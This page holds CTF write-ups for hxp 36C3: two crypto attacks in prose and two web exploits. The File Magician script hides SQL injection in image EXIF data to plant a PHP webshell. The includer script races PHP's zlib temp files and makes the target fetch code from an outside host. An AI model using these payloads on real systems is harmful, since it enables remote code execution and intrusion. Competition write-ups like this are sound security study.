@@ -1,0 +1,469 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>hxp 36C3 CTF</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#file-magician">file-magician</a>
+    
+                <a class="dropdown-item" href="#includer">includer</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#peerreviewed">peerreviewed</a>
+    
+                <a class="dropdown-item" href="#bacon">bacon</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#file-magician" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">file-magician</span>
+            </a>
+    
+<a href="#includer" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">includer</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#peerreviewed" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">peerreviewed</span>
+            </a>
+    
+<a href="#bacon" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bacon</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="hxp-36c3-ctf"><a class="header-link" href="#hxp-36c3-ctf"></a>hxp 36C3 CTF</h1>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="file-magician"><a class="header-link" href="#file-magician"></a>File Magician</h3>
+<p>The server source code snippet:</p>
+<pre class="hljs"><code>session_start();
+
+<span class="hljs-keyword">if</span>( ! <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'id'</span>])) {
+    $_SESSION[<span class="hljs-string">'id'</span>] = bin2hex(random_bytes(<span class="hljs-number">32</span>));
+}
+
+$d = <span class="hljs-string">'/var/www/html/files/'</span>.$_SESSION[<span class="hljs-string">'id'</span>] . <span class="hljs-string">'/'</span>;
+@mkdir($d, <span class="hljs-number">0700</span>, <span class="hljs-keyword">TRUE</span>);
+chdir($d) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'chdir'</span>);
+
+$db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'sqlite:'</span> . $d . <span class="hljs-string">'db.sqlite3'</span>);
+$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$db-&gt;exec(<span class="hljs-string">'CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);'</span>);
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">'file'</span>]) &amp;&amp; $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'size'</span>] &lt; <span class="hljs-number">10</span>*<span class="hljs-number">1024</span> ){
+    $s = <span class="hljs-string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]). <span class="hljs-string">" ');"</span>;
+    $db-&gt;exec($s);
+    move_uploaded_file( $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'move_upload_file'</span>);
+}</code></pre><p>It&#39;s obvious that it&#39;s vulnerable to SQL injection if we can control <code>new finfo</code>. The output seems to be the same with Linux command <code>file</code>, as they depends on the <code>libmagic</code>.</p>
+<p>Let&#39;s get some file info from my home directory:</p>
+<pre class="hljs"><code>$ find ~ -exec file {} +
+
+...
+
+foobar.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.8, datetime=2019:05:10 21:21:39], baseline, precision 8, 1x1, components 3</code></pre><p>Bingo! The string <code>GIMP 2.10.8</code> in EXIF data can be replaced with arbitrary text. We can execute any SQL statement now.</p>
+<p>It&#39;s also worth to mention:</p>
+<ol class="list">
+<li>PDO support multiple SQL statement</li>
+<li>SQLlite <code>ATTACH database</code> can be used to write file</li>
+<li>We have write access of the directory</li>
+</ol>
+<p>Here is the payload:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+s = requests.session()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sql</span><span class="hljs-params">(q)</span>:</span>
+    res = open(<span class="hljs-string">'./1x1.jpg'</span>, <span class="hljs-string">'rb'</span>).read().replace(<span class="hljs-string">b'GIMP'</span>, f<span class="hljs-string">'''
+');{q};--
+'''</span>.strip().encode())
+    <span class="hljs-keyword">return</span> res
+
+url = <span class="hljs-string">'http://78.47.152.131:8000/'</span>
+s.get(url)
+files = {
+    <span class="hljs-string">'file'</span>: (<span class="hljs-string">'foo.jpg'</span>, open(<span class="hljs-string">'./1x1.jpg'</span>, <span class="hljs-string">'rb'</span>).read())
+}
+s.post(url, files=files)
+
+qs = [
+<span class="hljs-string">"ATTACH DATABASE 'bar.php' AS j;CREATE TABLE j.k (f text);"</span>,
+<span class="hljs-string">"ATTACH DATABASE 'bar.php' AS j;INSERT INTO j.k (f) VALUES ('&lt;?php system(\"cat /f*\");?&gt;');"</span>
+]
+<span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> qs:
+    files = {
+        <span class="hljs-string">'file'</span>: (<span class="hljs-string">'foo.jpg'</span>, sql(q))
+    }
+    s.post(url, files=files)
+    s.get(url)
+    r = s.get(url)
+    print(q)
+    print(r.text)
+path = re.findall(<span class="hljs-string">'href="(.*)/1"'</span>, r.text)[<span class="hljs-number">0</span>]
+print(url + path + <span class="hljs-string">'/bar.php'</span>)
+r = s.get(url + path + <span class="hljs-string">'/bar.php'</span>)
+print(r.text)</code></pre><p>The flag is <code>hxp{I should have listened to my mum about not trusting files about files}</code>.</p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<p>I didn&#39;t know PDO can execute multiple queries at the beginning, so I was working on these:</p>
+<ul class="list">
+<li>Inject <code>lastIndexId()</code>: However this function return type is [integer] (<a href="https://www.sqlite.org/c3ref/last_insert_rowid.html)">https://www.sqlite.org/c3ref/last_insert_rowid.html)</a>.</li>
+<li>Control <code>lastIndexId()</code>: Though SQLite accepts <a href="https://dba.stackexchange.com/questions/106364/text-string-stored-in-sqlite-integer-column">string in integer type</a>, it does not apply to <a href="https://www.sqlite.org/lang_createtable.html#rowid">ROWID</a>. It must be an integer.</li>
+<li>Insert and update: SQlite supports <a href="https://www.sqlite.org/lang_UPSERT.html">UPSERT</a>, where we can possibly update values through a UPDATE statement SQL injection, but we don&#39;t have any UNIQUE field in that table.</li>
+</ul>
+<h3 id="includer"><a class="header-link" href="#includer"></a>includer</h3>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
+
+$rand_dir = <span class="hljs-string">'files/'</span>.bin2hex(random_bytes(<span class="hljs-number">32</span>));
+mkdir($rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'mkdir'</span>);
+putenv(<span class="hljs-string">'TMPDIR='</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/'</span>.$rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'putenv'</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">'Hello '</span>.$_POST[<span class="hljs-string">'name'</span>].<span class="hljs-string">' your sandbox: '</span>.$rand_dir.<span class="hljs-string">"\n"</span>;
+
+<span class="hljs-keyword">try</span> {
+    <span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">'file'</span>]), <span class="hljs-string">'&lt;?'</span>) === <span class="hljs-keyword">false</span>) {
+        <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">'file'</span>]);
+    }
+}
+<span class="hljs-keyword">finally</span> {
+    system(<span class="hljs-string">'rm -rf '</span>.escapeshellarg($rand_dir));
+}</span></code></pre><p>In this challenge, it will create a directory as temporary directory with random name every request.</p>
+<p>But it disables the http upload and session, so it is very hard to create a temporary file.</p>
+<p>If we take a look at the php-src (<a href="https://github.com/php/php-src)">https://github.com/php/php-src)</a>, we will find out that we can use <code>compress.zlib://</code> to upload a temporary file with arbitrary content.</p>
+<p>In <code>ext/zlib/zlib_fopen_wrapper.c</code>: </p>
+<pre class="hljs"><code><span class="hljs-function">php_stream *<span class="hljs-title">php_stream_gzopen</span><span class="hljs-params">(php_stream_wrapper *wrapper, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,
+                                  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span>
+</span>{
+    <span class="hljs-keyword">struct</span> <span class="hljs-keyword">php_gz_stream_data_t</span> *self;
+    php_stream *stream = <span class="hljs-literal">NULL</span>, *innerstream = <span class="hljs-literal">NULL</span>;
+
+    <span class="hljs-comment">/* sanity check the stream: it can be either read-only or write-only */</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(mode, <span class="hljs-string">'+'</span>)) {
+        <span class="hljs-keyword">if</span> (options &amp; REPORT_ERRORS) {
+            php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">"cannot open a zlib stream for reading and writing at the same time!"</span>);
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
+    }
+
+    <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">"compress.zlib://"</span>, path, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {
+        path += <span class="hljs-number">16</span>;
+    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">"zlib:"</span>, path, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
+        path += <span class="hljs-number">5</span>;
+    }
+
+    innerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);
+    ....</code></pre><p>It set the <code>STREAM_WILL_CAST</code> option.</p>
+<p>and in the <code>main/streams/streams.c</code>:</p>
+<pre class="hljs"><code>PHPAPI php_stream *_php_stream_open_wrapper_ex(const <span class="hljs-keyword">char</span> *path, const <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> <span class="hljs-keyword">options</span>,
+        zend_string **opened_path, php_stream_context *context STREAMS_DC)
+{
+      <span class="hljs-comment">// ....</span>
+        <span class="hljs-keyword">if</span> (stream != <span class="hljs-keyword">NULL</span> &amp;&amp; (<span class="hljs-keyword">options</span> &amp; STREAM_MUST_SEEK)) {
+        php_stream *newstream;
+
+        <span class="hljs-keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,
+                    (<span class="hljs-keyword">options</span> &amp; STREAM_WILL_CAST)
+                        ? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE)) {
+        <span class="hljs-comment">// ....</span>
+}</code></pre><p>The <code>_php_stream_open_wrapper_ex()</code> function will call the <code>php_stream_make_seekable_rel()</code> with <code>PHP_STREAM_PREFER_STDIO</code> flag if the <code>STREAM_WILL_CAST</code> option has been set.</p>
+<p>Then in the <code>main/streams/cast.c</code>:</p>
+<pre class="hljs"><code>PHPAPI int _php_stream_make_seekable(php_stream *origstream, php_stream **<span class="hljs-keyword">new</span><span class="hljs-type">stream</span>, int flags STREAMS_DC)
+{
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span><span class="hljs-type">stream</span> == NULL) {
+        <span class="hljs-keyword">return</span> PHP_STREAM_FAILED;
+    }
+    *<span class="hljs-keyword">new</span><span class="hljs-type">stream</span> = NULL;
+
+    <span class="hljs-keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="hljs-number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;seek != NULL) {
+        *<span class="hljs-keyword">new</span><span class="hljs-type">stream</span> = origstream;
+        <span class="hljs-keyword">return</span> PHP_STREAM_UNCHANGED;
+    }
+
+    <span class="hljs-comment">/* Use a tmpfile and copy the old streams contents into it */</span>
+
+    <span class="hljs-keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) {
+        *<span class="hljs-keyword">new</span><span class="hljs-type">stream</span> = php_stream_fopen_tmpfile();
+    } <span class="hljs-keyword">else</span> {
+        *<span class="hljs-keyword">new</span><span class="hljs-type">stream</span> = php_stream_temp_new<span class="hljs-type"></span>();
+    }
+  <span class="hljs-comment">// ... </span></code></pre><p>If the <code>PHP_STREAM_PREFER_STDIO</code> has been set, it will call the <code>php_stream_fopen_tmpfile()</code> to create temporary file.</p>
+<p>So we can create our temporary file with arbitrary content now.</p>
+<p>Our target is obvious:</p>
+<ol class="list">
+<li>Using <code>compress.zlib://http://myserver</code> to upload some trash, but don&#39;t close the connection</li>
+<li>Using <code>.well-known../files/xxxxxxxxxxx/</code> to list our temporary file name (xxxxxxxxxxx is directory name)</li>
+<li>Using <code>file_get_contents</code> to read the temporary file with another session</li>
+<li>Because the temp file doesn&#39;t contain <code>&lt;?</code>, so it will pass the check</li>
+<li>Send our php code from the previous connection</li>
+<li>Include the temp file with our php code</li>
+</ol>
+<p>Because we need to send php code between <code>file_get_contents()</code> and <code>include()</code>, so we should race it! (step 3 ~ step 6)</p>
+<p>And there is another problem, we need to get the directory name in the step 1, but the connection can&#39;t be closed.</p>
+<p>To solve this problem, we use the <code>$_POST[&#39;name&#39;]</code> to stuff the php output buffer.</p>
+<p>Then we&#39;ll see the random directory name without closing the connection.</p>
+<p>Exploit:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-keyword">for</span> gg <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+
+    r = remote(<span class="hljs-string">"78.47.165.85"</span>, <span class="hljs-number">8004</span>)
+    l = listen(<span class="hljs-number">5487</span>)
+
+    payload = <span class="hljs-string">'''POST / HTTP/1.1
+Host: 78.47.165.85:8004
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
+Content-Length: 8098
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+name={}&amp;file=compress.zlib://http://kaibro.tw:5487'''</span>.format(<span class="hljs-string">"a"</span>*<span class="hljs-number">8050</span>).replace(<span class="hljs-string">"\n"</span>,<span class="hljs-string">"\r\n"</span>)
+
+
+    r.send(payload)
+    r.recvuntil(<span class="hljs-string">"your sandbox: "</span>)
+    dirname = r.recv(<span class="hljs-number">70</span>)
+
+    print(<span class="hljs-string">"[DEBUG]:"</span> + dirname)
+
+    <span class="hljs-comment"># send trash</span>
+    c = l.wait_for_connection()
+    resp = <span class="hljs-string">'''HTTP/1.1 200 OK
+Date: Sun, 29 Dec 2019 05:22:47 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 534
+Content-Type: text/html; charset=UTF-8
+
+AAA
+BBB'''</span>.replace(<span class="hljs-string">"\n"</span>,<span class="hljs-string">"\r\n"</span>)
+    c.send(resp)
+
+
+    <span class="hljs-comment"># get filename</span>
+    r2 = requests.get(<span class="hljs-string">"http://78.47.165.85:8004/.well-known../"</span>+ dirname + <span class="hljs-string">"/"</span>)
+    tmpname = <span class="hljs-string">"php"</span> + re.findall(<span class="hljs-string">"&gt;php(.*)&lt;\/a"</span>,r2.text)[<span class="hljs-number">0</span>]
+    print(<span class="hljs-string">"[DEBUG]:"</span> + tmpname)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">job</span><span class="hljs-params">()</span>:</span>
+        time.sleep(<span class="hljs-number">0.26</span>)
+        phpcode = <span class="hljs-string">'wtf&lt;?php system("/readflag");?&gt;'</span>;
+        c.send(phpcode)
+
+    t = threading.Thread(target = job)
+    t.start()
+
+    <span class="hljs-comment"># file_get_contents and include tmp file</span>
+    exp_file = dirname + <span class="hljs-string">"/"</span> + tmpname
+    print(<span class="hljs-string">"[DEBUG]:"</span>+exp_file)
+    r3 = requests.post(<span class="hljs-string">"http://78.47.165.85:8004/"</span>, data={<span class="hljs-string">'file'</span>:exp_file})
+    print(r3.status_code,r3.text)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">"wtf"</span> <span class="hljs-keyword">in</span> r3.text:
+        <span class="hljs-keyword">break</span>
+
+    t.join()
+    r.close()
+    l.close()
+    <span class="hljs-comment">#r.interactive()</span></code></pre><p>flag: <code>hxp{I don&#39;t care what the people say I read my php-src everyday}</code></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="peerreviewed"><a class="header-link" href="#peerreviewed"></a>peerreviewed</h3>
+<p>As the paper shown, the plaintext $p$ is a point on 2D Cartesian plane, and the encryption follows a 3-pass protocol.</p>
+<p>Before the communication begins, Alice secretly decides 2-by-2 matrices $O_A, A$.</p>
+<p>$O_A$ is a rotation matrix, and $A$ is a matrix of form <code>[[a, b], [-b, a]</code>.</p>
+<p>Bob secretly decides $O_B, B$ similarly.</p>
+<p>Then, they communicate like following.</p>
+<ul class="list">
+<li>Alice -&gt; Bob: $y_1 = p\times O_A\times A$</li>
+<li>Bob -&gt; Alice: $y_2 = y_1\times O_B\times B$</li>
+<li>Alice -&gt; Bob: $y_3 = y_2\times O_A^{-1}\times A^{-1}$</li>
+<li>Now Bob can obtain $p$ by calculating $y_3\times O_B^{-1}\times B^{-1}$.</li>
+</ul>
+<p>The paper said if only $O_A, O_B$ are used, then it&#39;ll be not secure enough because they are rotation matrix, and one can easily get $O_A, O_B$ from $y_1, y_2, y_3$. By adding <strong>nonce matrix</strong>  $A, B$ into this encryption system, it&#39;ll be secure enough. <strong><em>&quot;the only identified way one can compromise the protocol security is by applying brute force attacks&quot;</em></strong> , the paper said.</p>
+<p>However, both $A, B$ are of form <code>[[a, b], [-b, a]</code>. They are simply scaled rotation matrices. Thus, both $O_A\times A$ and $O_B\times B$ are also scaled rotation matrices, and they are still easily obtained from $y_1, y_2, y_3$.</p>
+<p>flag: <code>hxp{p33r_r3v13w3d_m4y_n0t_b3_1337_r3v13w3d}</code></p>
+<h3 id="bacon"><a class="header-link" href="#bacon"></a>bacon</h3>
+<p>This challenge is based on <a href="https://en.wikipedia.org/wiki/Speck_(cipher">Speck Cipher</a>) with 48-bit block size and 72-bit key size.</p>
+<p>You need to give the server a key, such that the encrypted data of a null block is an assigned value. However, the encryption is strange: they cut the long key into a few chunks and use each chunk sequentially to finish the encryption.</p>
+<p>In this way, one can pick a key of two-chunk length, search the first part and the second part independently. That is essentially the Meet-in-the-middle attack. Cause the block size is only 48 bits, the expected trials for Meet-in-the-middle attack is roughly $2^{24}$, which should be feasible in the 100-second timeout.</p>
+<p>Note: The implementation of this attack needs to be efficient enough. In my case, I found a pip package and used it in the beginning. However, it is way too slow to solve it (something like 100 times slower than needed), because all the crypto computation is implemented in Python. I used C-implemented Speck cipher with C++&#39;s <code>unordered_map</code> at the end (single threaded), which can usually find the collision in 40 seconds.</p>
+<p>flag: <code>hxp{7h3Y_f1n4Lly_m4d3_a_t0Y_c1ph3R_f0r_CTF_Ta5kz}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
